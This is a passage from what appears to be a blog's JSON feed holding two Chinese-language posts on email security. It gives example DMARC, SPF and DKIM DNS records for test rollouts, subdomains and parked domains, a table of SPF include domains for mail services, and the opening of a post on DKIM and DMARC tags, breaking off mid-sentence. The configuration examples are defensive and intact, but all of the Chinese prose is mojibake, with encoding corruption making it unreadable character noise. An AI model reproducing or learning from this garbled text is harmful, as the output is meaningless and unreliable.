æ•ˆæœå¦‚ä½•ï¼Œç­‰å¯¦é©—äº†ä¸€é™£å­éƒ½æ²’å•é¡Œï¼Œå†é€æ¼¸æ”¹æˆæ›´åš´æ ¼çš„ <code>p=quarantine</code> ï¼Œç©©å®šå¾Œä½¿ç”¨ <code>p=reject</code>ã€‚</p>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%B8%80%EF%BC%9A%E5%AF%A6%E9%A9%97%E4%B8%AD\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%B8%80%EF%BC%9A%E5%AF%A6%E9%A9%97%E4%B8%AD\">#</a> æƒ…å¢ƒä¸€ï¼šå¯¦é©—ä¸­</h3>\n<p>å¦‚æœä½ é‚„åœ¨å¯¦é©—éšæ®µï¼Œä¸å¸Œæœ›æ‰€æœ‰çš„ä¿¡éƒ½è¢«æ“‹ä¸‹ï¼Œå¯ä»¥ç”¨å¯¬é¬†ä¸€é»çš„ policy æˆ–æ˜¯ä½ä¸€é»çš„ percentage è®“éƒ¨åˆ†ä¿¡ä»¶é€šéé©—è­‰ï¼š</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">// lax policy  <br>v=DMARC1 p=none rua=mailto:xx ruf=mailto:xx<br><br>// lower percentage of policy application  <br>v=DMARC1 p=quarantine pct=20 rua=mailto:xx ruf=mailto:xx</code></pre>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%BA%8C%EF%BC%9A%E6%B2%92%E6%9C%89%E5%AD%90%E7%B6%B2%E5%9F%9F\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%BA%8C%EF%BC%9A%E6%B2%92%E6%9C%89%E5%AD%90%E7%B6%B2%E5%9F%9F\">#</a> æƒ…å¢ƒäºŒï¼šæ²’æœ‰å­ç¶²åŸŸ</h3>\n<p>å¦‚æœå¯„ä¿¡ç¶²åŸŸåªæœ‰ä¸€å€‹ï¼Œæˆ–æ˜¯æ²’æœ‰å¤šå€‹å­ç¶²åŸŸå…±ç”¨ DMARC ç´€éŒ„ï¼š</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=DMARC1 p=reject aspf=s adkim=s rua=mailto:xx ruf=mailto:xx</code></pre>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%B8%89%EF%BC%9A%E5%AD%90%E7%B6%B2%E5%9F%9F%E5%85%B1%E7%94%A8-dmarc\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%B8%89%EF%BC%9A%E5%AD%90%E7%B6%B2%E5%9F%9F%E5%85%B1%E7%94%A8-dmarc\">#</a> æƒ…å¢ƒä¸‰ï¼šå­ç¶²åŸŸå…±ç”¨ DMARC</h3>\n<p>å¦‚æœ DMARC ç´€éŒ„æ¶µè“‹å¤šå€‹å­ç¶²åŸŸï¼š</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=DMARC1 p=reject rua=mailto:xx ruf=mailto:xx</code></pre>\n<p>å¦‚æœä½ æƒ³ç‚ºå­ç¶²åŸŸè¨­å®šå¯¬é¬†ä¸€é»çš„ policyï¼Œä¹Ÿå¯ä»¥ç”¨ <code>sp</code></p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=DMARC1 p=reject sp=quarantine rua=mailto:xx ruf=mailto:xx</code></pre>\n<h3 id=\"%E7%99%BC%E5%B8%83%E7%B4%80%E9%8C%84-2\"><a class=\"direct-link\" href=\"#%E7%99%BC%E5%B8%83%E7%B4%80%E9%8C%84-2\">#</a> ç™¼å¸ƒç´€éŒ„</h3>\n<p>è«‹åœ¨ä½ çš„ DNS è£¡ä»¥ TXT é¡å‹ç™¼å¸ƒåˆ° <code>_dmarc.&lt;yourdomain&gt;</code> é€™å€‹ç¶²åŸŸï¼Œæ‡‰è©²ä¸€æ¨£å¹¾åˆ†é˜å°±å¯ä»¥åœ¨ mxtoolbox ä¸ŠæŸ¥è©¢åˆ°äº†ã€‚å¦‚æœæœ‰æŠŠå ±å‘Šå¯„åˆ°å…¶ä»–ç¶²åŸŸï¼Œä¹Ÿè«‹ç¢ºå®šæœ‰ç™¼å¸ƒæˆæ¬Šç´€éŒ„ã€‚</p>\n<h3 id=\"%E4%B8%8D%E5%AF%84%E4%BF%A1%E7%9A%84%E7%B6%B2%E5%9F%9F\"><a class=\"direct-link\" href=\"#%E4%B8%8D%E5%AF%84%E4%BF%A1%E7%9A%84%E7%B6%B2%E5%9F%9F\">#</a> ä¸å¯„ä¿¡çš„ç¶²åŸŸ</h3>\n<p>ä¸Šé¢è¬›äº†æœƒå¯„ä¿¡çš„ç¶²åŸŸè©²å¦‚ä½•è¨­ç½®ï¼Œé‚£ä¸å¯„ä¿¡çš„ç¶²åŸŸæ€éº¼è¾¦å‘¢ï¼Ÿç•¢ç«Ÿä»€éº¼éƒ½æ²’è¨­ç½®çš„è©±ï¼Œé§­å®¢ç”¨é€™äº›å­ç¶²åŸŸå¯„ä¿¡å°±èƒ½èº²éé©—è­‰å•Šï¼</p>\n<p>å¾ˆç°¡å–®ï¼Œæ˜æ–‡ç¦æ­¢æ‰€æœ‰ä¿¡ä»¶å°±å¥½ã€‚å¦‚æœæœ‰å¾ˆå¤šå€‹ä¸å¯„ä¿¡çš„ç¶²åŸŸçš„è©±ï¼Œä¹Ÿå¯ä»¥ç”¨ CNAME çš„æ–¹å¼æŒ‡åˆ°ä¸€ç­†ç´€éŒ„ï¼Œæ–¹ä¾¿ç®¡ç†ã€‚</p>\n<pre class=\"language-txt\"><code class=\"language-txt\"># SPF<br>record: v=spf1 -all  <br>DNS: parked.mydom.com TXT \"v=spf1 -all\"<br><br># DKIM<br>record: v=DKIM1; p=  <br>DNS: \\*.\\_domainkey.parked.mydom.com TXT \"v=DKIM1; p=\"<br><br># DMARC<br>record: v=DMARC1; p=reject; rua=mailto:xx; ruf=mailto:xx  <br>## DNS for one parked domain:  <br>_dmarc.parked.mydom.com TXT \"v=DMARC1; p=reject; rua=mailto:xx; ruf=mailto:xx\"<br><br>## DNS for many parked domains:   <br>_dmarc.parked1.mydom.com CNAME _dmarc.parkeddoms.mydom.com  <br>_dmarc.parked2.mydom.com CNAME _dmarc.parkeddoms.mydom.com  <br>_dmarc.parked3.mydom.com CNAME _dmarc.parkeddoms.mydom.com  <br>_dmarc.parkeddoms.mydom.com TXT \"v=DMARC1; p=reject; rua=mailto:xx; ruf=mailto:xx\"</code></pre>\n<hr>\n<h3 id=\"resources\"><a class=\"direct-link\" href=\"#resources\">#</a> Resources</h3>\n<ul>\n<li><a href=\"https://dmarcly.com/blog/how-to-set-up-dmarc-dkim-and-spf-in-office-365-o365-the-complete-implementation-guide\">DMARCLY: Setting up SPF, DKIM, DMARC for Office365</a></li>\n<li><a href=\"https://dmarcly.com/blog/how-to-set-up-spf-and-dkim-for-amazon-ses\">DMARCLY: Setting up SPF, DKIM for Amazon SES</a></li>\n<li><a href=\"https://dmarcly.com/blog/spf-dkim-dmarc-set-up-guide-for-g-suite-gmail-for-business\">DMARCLY: Setting up SPF, DKIM, DMARC for Gsuite</a></li>\n</ul>\n<p><strong>SPF domains for common third party services:</strong></p>\n<table>\n<thead>\n<tr>\n<th>Service</th>\n<th>SPF</th>\n<th>Lookups</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Google</td>\n<td><code>_spf.google.com</code></td>\n<td>4</td>\n</tr>\n<tr>\n<td>Microsoft (Office 365)</td>\n<td><code>spf.protection.outlook.com</code></td>\n<td>2</td>\n</tr>\n<tr>\n<td>Amazon SES</td>\n<td><code>amazonses.com</code></td>\n<td>1</td>\n</tr>\n<tr>\n<td>MailChimp</td>\n<td><code>servers.mcsv.net</code></td>\n<td>1</td>\n</tr>\n<tr>\n<td>SendGrid</td>\n<td><code>sendgrid.net</code></td>\n<td>2</td>\n</tr>\n<tr>\n<td>FreshDesk</td>\n<td><code>email.freshdesk.com</code></td>\n<td>7 (includes sendgrid)</td>\n</tr>\n<tr>\n<td>Mandrill</td>\n<td><code>spf.mandrillapp.com</code></td>\n<td>1</td>\n</tr>\n<tr>\n<td>Mailgun</td>\n<td><code>mailgun.org</code></td>\n<td>3</td>\n</tr>\n<tr>\n<td>Mimecast</td>\n<td><code>_netblocks.mimecast.com</code></td>\n<td>6</td>\n</tr>\n<tr>\n<td>Postmark</td>\n<td><code>spf.mtasv.net</code></td>\n<td>1</td>\n</tr>\n<tr>\n<td>HelpScout</td>\n<td><code>helpscoutemail.com</code></td>\n<td>1</td>\n</tr>\n<tr>\n<td>Qualtrics</td>\n<td><code>_spf.qualtrics.com</code></td>\n<td>1</td>\n</tr>\n<tr>\n<td>SparkPost</td>\n<td><code>sparkpostmail.com</code></td>\n<td>2</td>\n</tr>\n<tr>\n<td>Zoho</td>\n<td><code>zoho.com</code></td>\n<td>1</td>\n</tr>\n<tr>\n<td>Salesforce</td>\n<td><code>_spf.salesforce.com</code></td>\n<td>2</td>\n</tr>\n<tr>\n<td>Zendesk</td>\n<td><code>mail.zendesk.com</code></td>\n<td>1</td>\n</tr>\n<tr>\n<td>ConstantContact</td>\n<td><code>spf.constantcontact.com</code></td>\n<td>1</td>\n</tr>\n<tr>\n<td>Sendinblue</td>\n<td><code>sendinblue.com</code></td>\n<td>9 (includes google and zendesk)</td>\n</tr>\n<tr>\n<td>MailerLite</td>\n<td><code>_spf.mlsend.com</code></td>\n<td>1</td>\n</tr>\n<tr>\n<td>Keap</td>\n<td><code>infusionmail.com</code></td>\n<td>2</td>\n</tr>\n<tr>\n<td>Sendpulse</td>\n<td><code>mxsmtp.sendpulse.com</code></td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n",
      "date_published": "2021-07-16T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-dkimdmarc/",
      "url": "https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-dkimdmarc/",
      "title": "é—œæ–¼ email security çš„å¤§å°äº‹â€Šâ€”â€Šè¨­å®šç¯‡ DKIMã€DMARC",
      "content_html": "<!-- summary -->\n<p>æ¥çºŒè‘—å‰ä¸€ç¯‡ï¼Œæˆ‘å€‘ä¾†è¬›è¬› DKIM è·Ÿ DMARC çš„è¨­å®šã€‚</p>\n<!-- summary -->\n<p>è€è©±ä¸€å¥ï¼Œé€™è£¡çš„ã€è¨­å®šã€ä¸¦ä¸æ˜¯å›ç­”ä½ ã€å¦‚ä½•åœ¨ google æˆ–æ˜¯ Office365 è¨­å¥½é€™äº›ç´€éŒ„ã€ã€ã€ç”¨ XX æœå‹™çµæœä¿¡å¯„ä¸åˆ°æ€éº¼è¾¦ã€ï¼Œé€™ç¨®æ“ä½œé…ç½®çš„æ•™å­¸æ–‡è«‹åƒè€ƒå®˜æ–¹æ–‡ä»¶ï¼Œç•¢ç«Ÿ email provider åƒåƒç™¾ç™¾å®¶ï¼Œå„è‡ªå¯èƒ½æœ‰çš„å•é¡Œæ›´æ˜¯é›£ä»¥å½™æ•´ã€‚</p>\n<p>æˆ‘æƒ³å‘Šè¨´ä½ çš„ã€è¨­å®šã€æ˜¯ SPFã€DMARC çš„ DNS ç´€éŒ„æœ¬èº«æœ‰å“ªäº›æ¨™ç±¤ï¼Œä»¥åŠè¨­ç½®é€™äº›é¸é …æ™‚å¯èƒ½ä¸å°å¿ƒè¸©åˆ°å“ªäº›åœ°é›·ï¼Œå°è‡´æ”¶ä¿¡æ–¹çš„ email server åœ¨é©—è­‰ä½ çš„éƒµä»¶æ™‚å‡ºç¾éé æœŸåœ°å ±éŒ¯ï¼Œè€Œåˆ¤æ–·é©—è­‰å¤±æ•—ã€‚å¦å¤–ï¼Œä¹Ÿæœƒå‘Šè¨´ä½ å¦‚æœæœ‰å¤šå€‹å­ç¶²åŸŸï¼Œæˆ–æœ‰ä½¿ç”¨ç¬¬ä¸‰æ–¹å¯„ä¿¡æœå‹™æ™‚è©²æ€éº¼è¾¦ã€‚</p>\n<p>ç¸½ä¹‹ï¼Œå¯ä»¥æƒ³æˆæ˜¯å›ç­”ä½ ã€æˆ‘è©²æ€éº¼ç†è§£é€™äº›ç´€éŒ„ã€å’Œã€æ¯å€‹æ©Ÿåˆ¶æœ‰å“ªäº›é¸é …è·Ÿé™åˆ¶ã€ï¼Œè€Œä¸æ˜¯é‡å°å–®ä¸€ email provider çš„æ•™å­¸æ–‡ã€‚</p>\n<p>æœ‰ä¸æ‡‚æˆ–æ˜¯æƒ³äº†è§£æ›´å¤šç¯„ä¾‹èˆ‡å»¶ä¼¸è­°é¡Œï¼Œè«‹çœ‹æœ¬ç³»åˆ—å…¶ä»–ç¯‡ï½<br>\nå¦‚æœä½ é‚„ä¸å¤ªæ‡‚ SPFã€DKIMã€DMARC ğŸ‘‰ <a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-theory\">é—œæ–¼ email security çš„å¤§å°äº‹â€Šâ€”â€ŠåŸç†ç¯‡</a><br>\nå¦‚æœä½ åœ¨æ‰¾ SPF çš„è¨­å®š ğŸ‘‰ <a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-spf\">é—œæ–¼ email security çš„å¤§å°äº‹â€Šâ€”â€Šè¨­å®šç¯‡ SPF</a><br>\nå¦‚æœä½ æƒ³æ­é…è¨­å®šç¯„ä¾‹ ğŸ‘‰ <a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-examples\">é—œæ–¼ email security çš„å¤§å°äº‹â€Šâ€”â€Šç¯„ä¾‹ç¯‡</a><br>\nå¦‚æœä½ æƒ³äº†è§£å»¶ä¼¸è­°é¡Œ ğŸ‘‰ <a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-extra\">é—œæ–¼ email security çš„å¤§å°äº‹ â€” å»¶ä¼¸ç¯‡</a></p>\n<hr>\n<h2 id=\"dkim\"><a class=\"direct-link\" href=\"#dkim\">#</a> DKIM</h2>\n<p>æˆ‘å€‘å…ˆå¾ DKIM é–‹å§‹ï¼Œå› ç‚ºå°è¨­ç½®è€…ä¾†èªªï¼Œä»–æ˜¯æ¨™ç±¤å½ˆæ€§æœ€å°ã€å¯æ§é¸é …æœ€å°‘çš„é©—è­‰æ©Ÿåˆ¶ï¼Œæ‰€ä»¥ä¹Ÿä¸å¤ªå®¹æ˜“å‡ºéŒ¯ã€‚</p>\n<p>å›é¡§æˆ‘å€‘åœ¨åŸç†ç¯‡çœ‹åˆ°çš„ DKIM signatureï¼Œè£¡é¢æœ‰éå¸¸å¤šæ¬„ä½ï¼ŒåŒ…å«ç‰ˆæœ¬ã€åŠ å¯†æ³•ã€æ™‚é–“æˆ³ã€ç¶²åŸŸç­‰ç­‰ã€‚èˆ‰ä¾‹ä¾†èªªï¼Œç•¶æ”¶ä¿¡æ–¹çš„ email server çœ‹åˆ°ä¸‹åœ–é€™å€‹ DKIM signatureï¼Œå°±æœƒç”¨è£¡é¢çš„ <code>s=brisbane,d=example.net</code> çµ„åˆå‡º DKIM å…¬é‘°ç™¼è¡Œçš„ç¶²åŸŸï¼š<code>brisbane._domainkey.example.net</code>ï¼Œå†ç”¨æ‰¾åˆ°çš„å…¬é‘°è§£å¯† <code>bh</code>ï¼ˆbody hashï¼‰ ä¾†æ¯”å°é›œæ¹Šï¼ˆhashï¼‰ï¼Œé€²è€Œé©—è­‰ä¿¡ä»¶çœŸå¯¦æ€§ã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-theory/dkim-signature.png\" /><figcaption><p>DKIM signatureï¼ˆå–è‡ª ç¶­åŸºç™¾ç§‘ï¼‰</p>\n</figcaption></figure></p>\n<p>ä¸€èˆ¬ä¾†èªªï¼Œä½ çš„ email provider éƒ½æœƒæä¾›çµ¦ä½ ç”¢ç”Ÿ DKIM çš„å·¥å…·ï¼Œè£¡é¢çš„ç¶²åŸŸåç¨±ã€åŠ å¯†æ¼”ç®—æ³•ç­‰ç­‰éƒ½ä¸èƒ½æ›´æ”¹ï¼Œå¯ä»¥é…ç½®çš„é€šå¸¸åªæœ‰ï¼š</p>\n<ul>\n<li>é‡‘é‘°é•·åº¦ï¼š1024 æˆ–æ˜¯ 2048 ä½å…ƒã€‚</li>\n<li>prefix selectorï¼šä¹Ÿå°±æ˜¯æ¬„ä½ä¸­çš„ <code>s</code>ï¼Œæœƒè·Ÿ <code>d</code> ä¸€èµ·ç”¨æ–¼ DNS æŸ¥è©¢ï¼Œç”¨ä¾†è¾¨è­˜ä¸åŒçš„ DKIM å…¬é‘°ã€‚é€™å€‹å€¼å¯ä»¥æ˜¯ä»»ä½•å­—ä¸²ï¼Œä¸éå› ç‚ºæ˜¯ç”¨ä¾†çµ„æˆç™¼å¸ƒ DKIM ç´€éŒ„çš„ç¶²åŸŸåï¼Œæ‰€ä»¥ <code>(s,d)</code> å¿…é ˆæ˜¯ unique çš„ã€‚</li>\n</ul>\n<p>è¨­å®šå®Œæˆå¾Œå°±æŠŠå…¬é‘°ç™¼å¸ƒåœ¨ <code>&lt;selector&gt;._domainkey.&lt;domain&gt;</code> é€™å€‹ç¶²åŸŸä¸‹ï¼Œä»¥ onedegree ç‚ºä¾‹ï¼Œå­˜åœ¨å¦‚ä¸‹çš„ä¸€ç­† DKIM ç´€éŒ„ï¼š</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-settings-dkimdmarc/onedegree-dkim.png\" /><figcaption><p>OneDegree DKIM</p>\n</figcaption></figure></p>\n<p>æ ¹æ“š RFCï¼ŒDKIM signature ç”¢ç”Ÿæ–¼ Administrative Management Domains (ADMDs)ï¼Œåœ¨ä¿¡ä»¶çš„ creation èˆ‡ relay å‡å¯èƒ½ç™¼ç”Ÿï¼Œä¹Ÿå°±æ˜¯èªªä¸€å°ä¿¡ä»¶å¯èƒ½æ˜¯ç¶“éå¤šæ¬¡ç°½åçš„ï¼Œä¾‹å¦‚æˆ‘å€‘ä¹‹å‰æéçš„è½‰ç™¼ï¼ˆforwardingï¼‰å°±æœƒä¿ç•™åŸå§‹ä¿¡ä»¶çš„ç°½ç« ä¸¦ä¸”åŠ ä¸Šä¸­ç¹¼ email server è‡ªå·±çš„çš„ç°½ç« ã€‚ç•¶ä¿¡ä»¶å…§æœ‰å¤šå€‹ DKIM signatureï¼Œæ¯ä¸€å€‹éƒ½æœƒè¢«é©—è­‰ï¼Œä¸éåªéœ€è¦å…¶ä¸­ä¸€å€‹åŒæ™‚ç¬¦åˆ verification è·Ÿ alignmentï¼ŒDMARC å°±æœƒåˆ¤å®šç‚º passã€‚</p>\n<h3 id=\"%E5%A4%9A%E5%80%8B%E5%AD%90%E7%B6%B2%E5%9F%9F\"><a class=\"direct-link\" href=\"#%E5%A4%9A%E5%80%8B%E5%AD%90%E7%B6%B2%E5%9F%9F\">#</a> å¤šå€‹å­ç¶²åŸŸ</h3>\n<p>å¦‚æœä½ æœ‰å¤šå€‹æœƒå¯„ä¿¡çš„ç¶²åŸŸï¼Œå°±è¦ç‚ºæ¯ä¸€å€‹åˆ†åˆ¥è¨­ç½® DKIMï¼Œåªè¦ä»–å€‘çš„ selector ä¸åŒå³å¯ã€‚ä¾‹å¦‚ä½ è¨­ç½®äº†ä»¥ä¸‹å…©å€‹ç¶²åŸŸï¼š</p>\n<ul>\n<li><code>mydom.com</code>ï¼š <code>selector=happy, DNS at happy._domainkey.mydom.com</code></li>\n<li><code>sub.mydom.com</code>ï¼š <code>selector=sad, DNS at sad._domainkey.sub.mydom.com</code></li>\n</ul>\n<p>é‚£éº¼ä¸åŒç¶²åŸŸç°½ç½²å¯„å‡ºå»çš„ä¿¡æœƒç”¨å„è‡ªçš„ç§é‘°ï¼Œé©—è­‰æ™‚ä¹ŸæœƒæŸ¥è©¢åˆ°å°æ‡‰çš„å…¬é‘°ï¼Œä¸€åˆ‡é †åˆ©ã€‚</p>\n<h3 id=\"%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8B%99\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8B%99\">#</a> ç¬¬ä¸‰æ–¹æœå‹™</h3>\n<p>å¦‚æœä½ æœ‰ä½¿ç”¨ç¬¬ä¸‰æ–¹çš„å¯„ä»¶æœå‹™ï¼Œä¾‹å¦‚ SendGridï¼Œä»–å€‘æœƒç‚ºä½ å‰µé€ ä¸€æŠŠ DKIM å…¬ç§é‘°ï¼Œç”¨è‡ªå·±çš„ç¶²åŸŸï¼ˆä¾‹å¦‚ <code>sendgrid.net</code>ï¼‰ç™¼å¸ƒå…¬é‘°ï¼Œå†çµ¦ä½ ä¸€ç­† CNAME å‹åˆ¥çš„ DKIM ç´€éŒ„ï¼š</p>\n<p><code>happy._domainkey.mydom.com CNAME s1.domainkey.uXXX.wlXXX.sendgrid.net</code></p>\n<p>é€™æ¨£æ”¶ä¿¡æ–¹è¦é©—è­‰ä½ ç”± SendGrid ç™¼å‡ºçš„ä¿¡æ™‚ï¼Œå°±æœƒå…ˆæŸ¥è©¢ <code>happy._domainkey.mydom.com</code>ï¼Œç„¶å¾Œè¢«å°åˆ°å¯¦éš›å¸¶æœ‰å…¬é‘°çš„ç¶²åŸŸ <code>s1.domainkey.uXXX.wlXXX.sendgrid.net</code>ã€‚</p>\n<hr>\n<h2 id=\"dmarc\"><a class=\"direct-link\" href=\"#dmarc\">#</a> DMARC</h2>\n<p>æœ€å¾Œæ˜¯ DMARC å•¦ï½ è·Ÿ SPF æ¯”èµ·ä¾†ï¼ŒDMARC é›–ç„¶æ¨™ç±¤ä¹Ÿä¸å°‘ï¼Œä½†åœ°é›·å°‘å¾—å¤šï¼Œè€Œä¸”å¯„é€å ±å‘Šçš„åŠŸèƒ½ä¹Ÿèƒ½æ–¹ä¾¿æˆ‘å€‘ debug é©—è­‰å¤±æ•—çš„éƒµä»¶åˆ°åº•æ˜¯å“ªè£¡å‡ºäº†å•é¡Œã€‚</p>\n<p>åŸç†ç¯‡æéï¼ŒDMARC æ˜¯å»ºç«‹åœ¨ SPF èˆ‡ DKIM ä¹‹ä¸Šçš„å¤§ä¸€çµ±é˜²ç·šï¼Œæ‰€ä»¥ç•¶ç„¶æ˜¯è¦å…ˆè¨­å¥½ SPF èˆ‡ DKIM å›‰ï¼é‚£å¦‚æœä»Šå¤©æ²’æœ‰æŠŠé€™å…©å€‹éƒ½è¨­å®šå¥½ï¼Œé›£é“ DMARC å°±ä¸€å®šæœƒ fail å—ï¼Ÿ</p>\n<p>å…¶å¯¦ä¹Ÿä¸æœƒï¼Œä½ åªæ˜¯ç„¡æ³•äº«å—åˆ°å®Œæ•´çš„ä¿è­·è€Œå·²ã€‚DMARC åªæœƒä»¥æœ‰è¨­ç½®çš„æ©Ÿåˆ¶åˆ¤æ–·ï¼Œæ‰€ä»¥å‡è¨­åªæœ‰è¨­ SPFï¼Œé‚£ DMARC å°±åªæœƒå° SPF åšé©—è­‰è·Ÿ alignment æª¢æŸ¥ï¼ŒDKIM æœƒè¢«è‡ªå‹•å¿½ç•¥ï¼Œé€™å°ä¿¡é›–ç„¶ä¸€æ¨£æœƒå¯„åˆ°ä½¿ç”¨è€…ä¿¡ç®±ï¼Œä½†å°±ä¸ä¿è­‰ä¿¡ä»¶å…§å®¹çš„çœŸå¯¦æ€§äº†ã€‚</p>\n<p>DMARC é‹ä½œæµç¨‹å¯ä»¥ç”¨ä¸‹é¢é€™å¼µ RFC è£¡å®šç¾©çš„ flowchart è¡¨ç¤ºï¼Œé‡é»æ³¨æ„ç´…è‰²æ¡†æ¡†çš„éƒ¨åˆ†ã€‚é»é»ï¼ˆâ€¦ï¼‰ä»£è¡¨ DNS queryï¼Œæ˜Ÿæ˜Ÿï¼ˆ***ï¼‰ä»£è¡¨æœ‰ data exchangeï¼Œæ‰€ä»¥å¯ä»¥çœ‹åˆ° DMARC æ˜¯å…ˆå¾—åˆ° SPF èˆ‡ DKIM çš„çµæœï¼Œå†è·Ÿ author domain é€²è¡Œ DNS query æ‹¿åˆ° DMARC ç´€éŒ„ï¼Œå¦‚æœæˆåŠŸæ‰¾åˆ°ç´€éŒ„å°±é…åˆ SPF èˆ‡ DKIM çš„çµæœå¾—å‡º DMARC é©—è­‰çš„çµè«–ï¼Œæœ€å¾ŒæŠŠé©—è­‰çµæœäº¤çµ¦ MDA åšä¿¡ä»¶çš„éæ¿¾ã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-settings-dkimdmarc/flowchart.png\" /><figcaption><p>Flowchart from RFC</p>\n</figcaption></figure></p>\n<p>DMARC é©—è­‰çµæœä¹Ÿæœƒåœ¨åŸå§‹ä¿¡ä»¶è£¡ç•™ä¸‹ç´€éŒ„ã€‚ä¸‹åœ–ç´…æ¡†çš„åœ°æ–¹åˆ†åˆ¥æ˜¯ SPF èˆ‡ DKIM çš„é©—è­‰åŠ ä¸Š alignment æª¢æŸ¥çš„çµæœï¼Œæœ€å¾Œçš„ compauth å‰‡æ˜¯ DMARC æœ¬èº«çš„é©—è­‰çµæœã€‚å› ç‚º SPF èˆ‡ DKIM éƒ½æ˜¯ passï¼Œæ‰€ä»¥ DMARC ä¹Ÿæ˜¯ passã€‚</p>\n<p>å¦å¤–ï¼Œåªè¦ SPF <strong>æˆ–</strong> DKIM é€šé alignment æª¢æŸ¥å°±å¯ä»¥ï¼Œä¸ç”¨å…©å€‹éƒ½ç¬¦åˆï¼</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-settings-dkimdmarc/dmarc-result.png\" /><figcaption><p>DMARC result</p>\n</figcaption></figure></p>\n<p>æ¥ä¸‹ä¾†é€²å…¥è¨­å®šçš„éƒ¨åˆ†ã€‚</p>\n<p>é¦–å…ˆè«‹æ³¨æ„ï¼ŒDMARC è¨­ç½®çš„ç¶²åŸŸè·Ÿ SPF ä¸åŒï¼Œ</p>\n<blockquote>\n<p>å¦‚æœä½ çš„ç¶²åŸŸæ˜¯ <code>mydom.com</code>ï¼Œé‚£ DMARC å°±æ˜¯åœ¨ <code>_dmarc.mydom.com</code> é€™å€‹å­ç¶²åŸŸä¸‹çš„ä¸€ç­† TXT ç´€éŒ„ï¼Œæ”¾åœ¨ <code>mydom.com</code> æ˜¯ç„¡æ•ˆçš„ï¼</p>\n</blockquote>\n<p>å€¼å¾—è£œå……çš„ä¸€é»æ˜¯ï¼Œåš DNS query çš„æ™‚å€™ï¼Œå¦‚æœæ²’åœ¨ç•¶å‰çš„ç¶²åŸŸæ‰¾åˆ° DMARC ç´€éŒ„ï¼Œå°±æœƒå¾€ä¸Šä¸€å±¤å»æ‰¾ organizational domain çš„ DMARC ç´€éŒ„ã€‚æ‰€ä»¥å‡è¨­ä½ æ˜¯ç”¨æŸå€‹å­ç¶²åŸŸï¼ˆ<code>mailing.mydom.com</code>ï¼‰å¯„ä¿¡ï¼Œé‚£ç•¶ <code>_dmarc.mailing.mydom.com</code> æ²’æœ‰ DMARC ç´€éŒ„æ™‚ï¼Œå°±æœƒå»æŠ“ <code>_dmarc.mydom.com</code> çš„ï¼Œä¸éé€™æ™‚ç”¨çš„ policy å°±æœƒæ˜¯ subdomain policyï¼ˆè«‹çœ‹ä¸‹é¢çš„ <code>sp</code> æ¨™ç±¤ï¼‰ã€‚é€™å€‹ç‰¹æ€§å…è¨±æˆ‘å€‘æ›´æ–¹ä¾¿åœ°è¨­ç½®è·Ÿç›£æ§ DMARCï¼Œä¸ç”¨ç‰¹åˆ¥ç‚ºæ¯å€‹å­ç¶²åŸŸé‡æ–°è¨­å®šä¸€ç­†ç´€éŒ„ã€‚</p>\n<p>å†ä¾†æˆ‘å€‘çœ‹çœ‹ DMARC æœ‰å“ªäº›æ¨™ç±¤å§ï¼æ¨™ç±¤èˆ‡æ¨™ç±¤å€¼ä¹‹é–“çš†ä»¥ä¸€å€‹ç­‰è™Ÿï¼ˆ<code>=</code>ï¼‰å€éš”ï¼Œä¸­é–“ä¸å¯ä»¥æœ‰ä»»ä½•ç©ºç™½ã€‚å¦‚æœåœ¨è§£æ DMARC ç´€éŒ„çš„æ™‚å€™ç™¼ç”Ÿèªæ³•éŒ¯èª¤ï¼Œä¾‹å¦‚ï¼šéŒ¯å­—ã€ä¸åœ¨å®šç¾©å…§çš„æœªçŸ¥æ¨™ç±¤æˆ–æ¨™ç±¤å€¼ã€é‡è¤‡çš„æ¨™ç±¤ã€å¤§å°å¯«éŒ¯èª¤ç­‰ç­‰ï¼Œéƒ½æœƒç›´æ¥è¢«å¿½ç•¥ã€‚ä¹Ÿå°±æ˜¯èªªï¼Œå‡ºéŒ¯çš„åœ°æ–¹æœƒè¢«å¥—ç”¨é è¨­æ¨™ç±¤å€¼ï¼Œè€Œé€™å€‹é è¨­å€¼é€šå¸¸æ˜¯æœ€å¯¬é¬†ã€ä¿è­·æ•ˆæœæœ€å·®çš„ã€‚</p>\n<p>ä»¥ä¸‹ä¾æ“šç”¨é€”ç°¡å–®åˆ†é¡äº†æ¨™ç±¤ï¼Œé™¤äº†é–‹é ­å¿…é ˆæ˜¯ <code>v=DMARC1</code> ä¸¦ç·Šæ¥å”¯ä¸€çš„å¿…è¦æ¨™ç±¤ <code>p</code> ä¹‹å¤–ï¼Œå…¶ä»–æ¨™ç±¤éƒ½æ˜¯ optional ï¼Œä¸”é †åºæ˜¯æ²’æœ‰è¦å®šçš„ã€‚</p>\n<h3 id=\"%E6%94%BF%E7%AD%96%E7%9B%B8%E9%97%9C\"><a class=\"direct-link\" href=\"#%E6%94%BF%E7%AD%96%E7%9B%B8%E9%97%9C\">#</a> æ”¿ç­–ç›¸é—œ</h3>\n<h5 id=\"p\"><a class=\"direct-link\" href=\"#p\">#</a> p</h5>\n<p>èªæ³•ç‚ºï¼š <code>p=action</code></p>\n<p>å³ policyï¼Œä¹Ÿå°±æ˜¯ç•¶ DMARC é©—è­‰çµæœç‚º 